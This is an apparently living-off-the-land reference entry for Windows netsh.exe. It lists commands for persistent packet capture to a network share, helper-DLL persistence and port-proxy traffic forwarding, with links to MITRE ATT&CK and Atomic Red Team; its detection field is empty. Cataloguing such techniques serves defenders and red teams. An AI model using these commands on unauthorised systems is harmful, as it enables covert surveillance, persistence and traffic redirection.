## Netsh.exe

* Functions: Execute, Surveillance

```
netsh trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl    
netsh trace show status    
    
netsh.exe add helper C:\Path\file.dll	
     
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
```

Acknowledgements:
* 

Code sample:
* 

Resources:
* https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Persistence/Netsh_Helper_DLL.md
* https://attack.mitre.org/wiki/Technique/T1128
* https://twitter.com/teemuluotio/status/990532938952527873

Full path:
```
c:\windows\system32\netsh.exe
c:\windows\sysWOW64\netsh.exe
```

Notes:



Detection:


 
